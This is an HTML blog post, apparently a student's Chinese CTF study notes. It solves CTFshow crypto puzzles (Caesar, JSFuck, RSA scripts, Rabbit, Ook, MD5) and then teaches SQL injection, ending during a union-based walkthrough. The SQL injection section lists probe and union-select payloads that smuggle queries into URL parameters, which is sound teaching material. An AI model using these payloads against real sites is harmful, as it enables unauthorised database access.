@@ -1,0 +1,985 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CTF相关 | Sarecter</title><meta name="author" content="Sarecter"><meta name="copyright" content="Sarecter"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="CryptoCTFshowcrypto0密文是有{}，且花括号前有四个字母，且所有字母中不存在flag，判断是[凯撒密码]([在线凯撒密码加密解密 (lddgo.net)](https:&#x2F;&#x2F;www.lddgo.net&#x2F;encrypt&#x2F;caesar-cipher#:~:text&#x3D;在密码学中，凯撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF相关">
+<meta property="og:url" content="http://sarecter.github.io/2024/10/11/CTF_study/index.html">
+<meta property="og:site_name" content="Sarecter">
+<meta property="og:description" content="CryptoCTFshowcrypto0密文是有{}，且花括号前有四个字母，且所有字母中不存在flag，判断是[凯撒密码]([在线凯撒密码加密解密 (lddgo.net)](https:&#x2F;&#x2F;www.lddgo.net&#x2F;encrypt&#x2F;caesar-cipher#:~:text&#x3D;在密码学中，凯撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://sarecter.github.io/imgs/008.jpg">
+<meta property="article:published_time" content="2024-10-11T12:52:51.491Z">
+<meta property="article:modified_time" content="2024-11-03T13:25:39.977Z">
+<meta property="article:author" content="Sarecter">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://sarecter.github.io/imgs/008.jpg"><link rel="shortcut icon" href="/imgs/%E5%9B%BE%E6%A0%872.png"><link rel="canonical" href="http://sarecter.github.io/2024/10/11/CTF_study/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        if (name && globalFn[key][name]) return
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const hour = new Date().getHours()
+          const isNight = hour <= 6 || hour >= 18
+          if (theme === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else theme === 'light' ? activateLightMode() : activateDarkMode()
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#48b1f5","bgDark":"#f1f1f1","position":"top-right"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CTF相关',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-03 21:25:39'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/imgs/013.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/imgs/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/imgs/008.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Sarecter</span></a><a class="nav-page-title" href="/"><span class="site-name">CTF相关</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CTF相关</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-10-11T12:52:51.491Z" title="Created 2024-10-11 20:52:51">2024-10-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-03T13:25:39.977Z" title="Updated 2024-11-03 21:25:39">2024-11-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="CTFshow"><a href="#CTFshow" class="headerlink" title="CTFshow"></a>CTFshow</h2><h3 id="crypto0"><a href="#crypto0" class="headerlink" title="crypto0"></a>crypto0</h3><p>密文是有{}，且花括号前有四个字母，且所有字母中不存在flag，判断是[凯撒密码]([在线凯撒密码加密解密 (lddgo.net)](<a target="_blank" rel="noopener" href="https://www.lddgo.net/encrypt/caesar-cipher#:~:text=%E5%9C%A8%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%EF%BC%8C%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81%EF%BC%88%E8%8B%B1%E8%AF%AD%EF%BC%9ACaesar">https://www.lddgo.net/encrypt/caesar-cipher#:~:text=在密码学中，凯撒密码（英语：Caesar</a> cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。,它是一种替换加密的技术， 明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。))，前移一位后得到flag：flag{hello_ctf}</p>
+<h3 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h3><p>打开附件后发现如下图所示内容：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241011205954386.png" alt="image-20241011205954386"></p>
+<p>大致就是！，+，[]，{}组成</p>
+<p>百度可知这是JSFuck编码</p>
+<p>&#x3D;&#x3D;JSFuck 是一种基于 JavaScript 的编程风格，它使用六个字符 <em>{}</em>, <em>[]</em>, <em>+</em>, <em>!</em> 来编写和执行代码。这种编码方式不依赖于浏览器，因此可以在 Node.js 上运行。JSFuck 的原理是利用 JavaScript 中的类型转换和对象属性访问机制来构造任何 JavaScript 代码。&#x3D;&#x3D;</p>
+<p>可以直接使用在线解码软件[JSfuck](<a target="_blank" rel="noopener" href="http://www.hiencode.com/jsfuck.html">CTF在线工具-在线JSfuck加密|在线JSfuck解密|JSfuck|JSfuck原理|JSfuck算法 (hiencode.com)</a>)</p>
+<p>也可以在浏览器中F12，在控制台中粘贴密文，然后执行即可得到flag</p>
+<p>解码得到  flag{3e858ccd79287cfe8509f15a71b4c45d}</p>
+<h3 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h3><p>下载附件后发现文档内容有点像JS还有一些颜文字，查询百度后得知这是<strong>aaEncode</strong>加密</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241012105858161.png" alt="image-20241012105858161"></p>
+<p>这里附一个解码工具[aaEncode](<a target="_blank" rel="noopener" href="https://toolwa.com/aaencode/">aaEncode 加密解密 - 工具哇 (toolwa.com)</a>)</p>
+<p>解码后得到     console.log(“flag{js_da_fa_hao}”);</p>
+<h3 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h3><p>观察题目所给的信息，是<strong>rsa加密</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p=447685307 q=2037 e=17</span><br><span class="line"></span><br><span class="line">提交flag&#123;d&#125;即可</span><br></pre></td></tr></table></figure>
+
+
+
+<p>下面详细解释一下什么叫<strong>rsa加密</strong></p>
+<h4 id="rsa加解密原理"><a href="#rsa加解密原理" class="headerlink" title="rsa加解密原理"></a>rsa加解密原理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(1). 对于明文M，则有密文C=M^e mod n  (获得密文是明文的e次方再模n，即求余数)    </span><br><span class="line"></span><br><span class="line">(2). 对于密文C，则有明文M=C^d mod n   (获得明文是密文的d次方再模n，即求余数)</span><br></pre></td></tr></table></figure>
+
+<p>其中把(e,n)叫做公钥，(d,n)叫做私钥，这样我们只要拿到了密文和私钥(d,n)就能解出明文了</p>
+<h4 id="密钥生成过程"><a href="#密钥生成过程" class="headerlink" title="密钥生成过程"></a>密钥生成过程</h4><ul>
+<li>准备两个素数：p,q</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n=p*q</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>求n的欧拉函数φ(n)</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">φ(n)=(p-1)(q-1)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>选取公钥e</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&lt;e&lt;φ(n),且e与φ(n)互质</span><br></pre></td></tr></table></figure>
+
+<p><strong>e在实际运用中一般为65537</strong></p>
+<ul>
+<li>计算私钥d</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d应满足：ed ≡ 1 (mod φ(n))             （即 （d*e）mod φ(n)=1）</span><br></pre></td></tr></table></figure>
+
+<p>此处的d求解可用py中的gmpy2库</p>
+<p>具体使用方法如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line"><span class="comment">#此处phi_n就是φ(n)</span></span><br></pre></td></tr></table></figure>
+
+<p>gmpy2库可以在python终端中使用下列语句进行下载：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install gmpy2</span><br></pre></td></tr></table></figure>
+
+<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">p=<span class="number">447685307</span></span><br><span class="line">q=<span class="number">2037</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line"></span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d:&quot;</span>, gmpy2.invert(e,phi_n))</span><br></pre></td></tr></table></figure>
+
+<h3 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h3><p>从题目所给信息可以知道这道题还是rsa，不过这次需要求m</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">447685307</span></span><br><span class="line">q = <span class="number">2037</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">c = <span class="number">704796792</span></span><br><span class="line"></span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">n = p*q</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m=c^d%n</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="comment"># pow(c,d,n)其中c是底数，d是指数，n是模数</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#输出为904332399012</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="crypto6"><a href="#crypto6" class="headerlink" title="crypto6"></a>crypto6</h3><p>附件内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">密文：</span><br><span class="line">U2FsdGVkX19mGsGlfI3nciNVpWZZRqZO2PYjJ1ZQuRqoiknyHSWeQv8ol0uRZP94</span><br><span class="line">MqeD2xz+</span><br><span class="line">密钥：</span><br><span class="line">加密方式名称</span><br></pre></td></tr></table></figure>
+
+<p>然后&#x3D;&#x3D;<strong>U2FsdGVkX1</strong>开头的可能是rabbit，AES，DES&#x3D;&#x3D;，此题为Rabbit加密</p>
+<p>附一个[Rabbit在线解密工具](<a target="_blank" rel="noopener" href="http://www.jsons.cn/rabbitencrypt/">Rabbit加密-Rabbit解密-在线Rabbit加密解密工具 (jsons.cn)</a>)</p>
+<p>解密后得到flag：flag{a8db1d82db78ed452ba0882fb9554fc9}</p>
+<h3 id="crypto7"><a href="#crypto7" class="headerlink" title="crypto7"></a>crypto7</h3><p>附件内容基本都是<strong>ook</strong>，所以是ook加密</p>
+<p>附一个[ook解密工具](<a target="_blank" rel="noopener" href="https://www.dcode.fr/ook-language">Ook! Programming Language - Esoteric Code Decoder, Online Translator (dcode.fr)</a>)</p>
+<p>解密后得到flag：flag{b615c4b79a1aede83b9ae67104ff4eb5}</p>
+<h3 id="crypto8"><a href="#crypto8" class="headerlink" title="crypto8"></a>crypto8</h3><p><strong>由<code>+ - [ ] &#123; &#125; . &lt; &gt;</code>这些符号构成的密码是[Brainfuck密码](<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/brainfuck">Brainfuck&#x2F;OoK加密解密 - Bugku CTF</a>)</strong></p>
+<p>解码后得到flag：flag{99754106633f94d350db34d548d6091a}</p>
+<h3 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h3><p>下载压缩包后发现有密码，使用工具进行爆破得到密码4132</p>
+<p>然后根据文件名字加serpent可知加密方式为[serpent加密](<a target="_blank" rel="noopener" href="http://serpent.online-domain-tools.com/">Serpent Encryption – Easily encrypt or decrypt strings or files (online-domain-tools.com)</a>)</p>
+<p>key为密码4132解码后得到flag：</p>
+<table>
+<thead>
+<tr>
+<th>f</th>
+<th>l</th>
+<th>a</th>
+<th>g</th>
+<th>{</th>
+<th>c</th>
+<th>9</th>
+<th>6</th>
+<th>0</th>
+<th>a</th>
+<th>0</th>
+<th>f</th>
+<th>3</th>
+<th>b</th>
+<th>f</th>
+<th>8</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>7</td>
+<td>1</td>
+<td>d</td>
+<td>7</td>
+<td>d</td>
+<td>a</td>
+<td>2</td>
+<td>a</td>
+<td>8</td>
+<td>4</td>
+<td>1</td>
+<td>3</td>
+<td>a</td>
+<td>e</td>
+<td>7</td>
+<td>8</td>
+</tr>
+<tr>
+<td>f</td>
+<td>7</td>
+<td>b</td>
+<td>5</td>
+<td>f</td>
+<td>}</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="crypto10"><a href="#crypto10" class="headerlink" title="crypto10"></a>crypto10</h3><p>附件内容字母与数字感觉像十六进制，并且有等号</p>
+<p><strong>[quoted-printable编码](<a target="_blank" rel="noopener" href="http://www.hiencode.com/quoted.html">CTF在线工具-在线Quoted-printable编码|在线Quoted-printable编码|邮件编码|mail编码 (hiencode.com)</a>),用一个等号”&#x3D;”后跟随两个十六进制数字(0–9或A–F)来表示一个非ASCII字符</strong></p>
+<p>最后解码得到flag：flag{用你那火热的嘴唇让我在午夜里无尽的销魂}</p>
+<h3 id="crypto11"><a href="#crypto11" class="headerlink" title="crypto11"></a>crypto11</h3><p>密文是由0~f组成的，且具有31位，猜测为[md5加密](<a target="_blank" rel="noopener" href="https://www.sojson.com/md5/">MD5在线加密&#x2F;解密&#x2F;破解—MD5在线 (sojson.com)</a>)</p>
+<p>正确的 MD5 应该是数字和字母的组合，并且是 16 位或者 32 位</p>
+<p>所以自行补全一位并进行解密得到flag：flag{ctf}</p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="CTFshow-1"><a href="#CTFshow-1" class="headerlink" title="CTFshow"></a>CTFshow</h2><h3 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h3><p>直接f12查看源码再base64解码得到flag：ctfshow{f2ef9fac-b24a-4f0c-8b92-1181ce59a4de}</p>
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>本题主要运用的知识点是<strong>sql注入</strong>，在此先简单解释一下什么是sql注入</p>
+<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p><strong>sql注入是因为后台服务器在接收参数时未做好过滤直接带入到数据库中查询，导致攻击者能够通过此构造拼接sql语句并执行相关命令</strong></p>
+<p>常用的注入手段可以在语句后面添加 **–+**注释掉后面的内容</p>
+<h4 id="sql注入漏洞挖掘"><a href="#sql注入漏洞挖掘" class="headerlink" title="sql注入漏洞挖掘"></a>sql注入漏洞挖掘</h4><ol>
+<li>优先观察页面存在传参的位置，如<strong>post传参和get传参</strong></li>
+<li>漏洞探测：burp截取查询的数据包，找到传参的变量然后在其后面加上单引号、双引号等如下进行测试：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#判断如下闭合方式是否会报错，会报错则肯定存在注入</span><br><span class="line">=test&#x27;                         </span><br><span class="line">=test&quot;                         </span><br><span class="line">#若不报错则判断是否存在布尔盲注，如果页面会有不同的显示在可能存在漏洞</span><br><span class="line">=test&#x27; and -1=-1 or &#x27;</span><br><span class="line">=test&#x27; and -1=-2 or &#x27;  </span><br><span class="line">         </span><br><span class="line">=test&quot; and -1=-1 or &quot;</span><br><span class="line">=test&quot; and -1=-2 or &quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>get型：如果是在burp中测试payload需要先进行url编码，浏览器中则不需要</strong></p>
+<p><strong>&#x3D;&#x3D;不进行编码的话，也可以用+代替空格，#代替–+ 。 %23代表#，也是注释符&#x3D;&#x3D;</strong></p>
+<p>这里解释一下**–+<strong>:在mysql语句中，– 表示注释，但在url中无法通过，需将空格转义成</strong>+<strong>，当然也可以直接</strong>– p**或者其他字符，都能起到注释效果</p>
+<p><strong>#<strong>也是一个注释符，但在url中同样需要转义，应该应用</strong>%23</strong></p>
+<h4 id="常见的注入手法"><a href="#常见的注入手法" class="headerlink" title="常见的注入手法"></a>常见的注入手法</h4><p>&#x3D;&#x3D;参数类型分类：&#x3D;&#x3D;</p>
+<ol>
+<li>数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</li>
+</ol>
+<p>如 <a target="_blank" rel="noopener" href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> 对应的sql语句为 select * from table where id&#x3D;3</p>
+<ol start="2">
+<li>字符型：字符型注入正好相反</li>
+</ol>
+<p>当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹</p>
+<p>例如数字型语句：select * from table where id &#x3D;3</p>
+<p>则字符型如下：select * from table where name&#x3D;’admin’</p>
+<p>&#x3D;&#x3D;注入手法分类：&#x3D;&#x3D;</p>
+<p>@   UNION query SQL injection（联合查询注入）<br>@   Error-based SQL injection（错型注入）<br>@   Boolean-based blind SQL injection（基于布尔的盲注）<br>@   Time-based blind SQL injection（基于时间的盲注）<br>@   Stacked queries SQL injection（可多语句查询注入）</p>
+<h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p><strong>&#x3D;&#x3D;联合注入适用于页面会根据输入变化而变化的情况&#x3D;&#x3D;</strong></p>
+<ol>
+<li>判断输入点</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用 ?id=1&#x27; 来判断注入点，若报错，则表示存在sql注入漏洞</span><br><span class="line"></span><br><span class="line">继续判断，输入 ?id=1&#x27; and 1=1 --+ 页面正常显示</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>判断当前表的字段个数</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure>
+
+<p>ORDER BY 语句用于根据指定的列对结果集进行排序:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 order by 列名(或者数字) asc；升序(默认升序)   #数字就是代替列名字</span><br><span class="line">select * from 表名 order by 列名(或者数字) desc；降序</span><br><span class="line">-- 如果该表只有n列，则输入?id=1&#x27; order by n+1 --+  时会报错，就能以此来判断表的列数</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>判断显示位</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>version()</td>
+<td>MySQL 版本</td>
+</tr>
+<tr>
+<td>user()</td>
+<td>当前数据库用户名</td>
+</tr>
+<tr>
+<td>database()</td>
+<td>当前数据库名</td>
+</tr>
+<tr>
+<td>@@version_compile_os</td>
+<td>操作系统版本</td>
+</tr>
+<tr>
+<td>@@datadir</td>
+<td>数据库路径</td>
+</tr>
+</tbody></table>
+<p>如下，在name和password值中回显了我们的输入，这时我们就可以在回显2或3的放置放入测试语句。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i-blog.csdnimg.cn/blog_migrate/20ce24d29102810e560bc97e4763f51e.png" alt="img"></p>
+<ol start="4">
+<li>爆当前数据库的名字</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>爆当前数据库的表</li>
+</ol>
